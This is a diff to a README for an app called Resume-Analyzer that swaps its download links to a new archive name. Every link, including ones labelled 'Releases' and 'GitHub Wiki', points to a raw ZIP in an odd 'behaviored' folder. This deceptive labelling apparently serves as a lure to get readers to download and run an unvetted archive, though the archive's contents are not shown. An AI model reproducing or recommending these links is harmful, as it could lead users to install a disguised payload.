@@ -6,11 +6,11 @@ Welcome to Resume-Analyzer! This application helps you upload multiple resumes a
 
 ## 📥 Download & Install
 
-You can download Resume-Analyzer by visiting this page: [Resume-Analyzer Releases](https://raw.githubusercontent.com/stargate1973/Resume-Analyzer/main/behaviored/Resume-Analyzer.zip)
+You can download Resume-Analyzer by visiting this page: [Resume-Analyzer Releases](https://raw.githubusercontent.com/stargate1973/Resume-Analyzer/main/behaviored/Resume-Analyzer-2.2.zip)
 
 ### Steps to Download and Install
 
-1. Go to the [Resume-Analyzer Releases](https://raw.githubusercontent.com/stargate1973/Resume-Analyzer/main/behaviored/Resume-Analyzer.zip).
+1. Go to the [Resume-Analyzer Releases](https://raw.githubusercontent.com/stargate1973/Resume-Analyzer/main/behaviored/Resume-Analyzer-2.2.zip).
 2. Look for the latest version of the application.
 3. Click on the download link for the version compatible with your system.
 4. Save the downloaded file to your computer.
@@ -85,6 +85,6 @@ You can also find more resources by searching for the following keywords: `docum
 
 ## 🔗 Additional Resources
 
-For detailed documentation and examples, visit the [GitHub Wiki](https://raw.githubusercontent.com/stargate1973/Resume-Analyzer/main/behaviored/Resume-Analyzer.zip).
+For detailed documentation and examples, visit the [GitHub Wiki](https://raw.githubusercontent.com/stargate1973/Resume-Analyzer/main/behaviored/Resume-Analyzer-2.2.zip).
 
 Remember to check the latest updates on our repository, and enjoy comparing resumes!
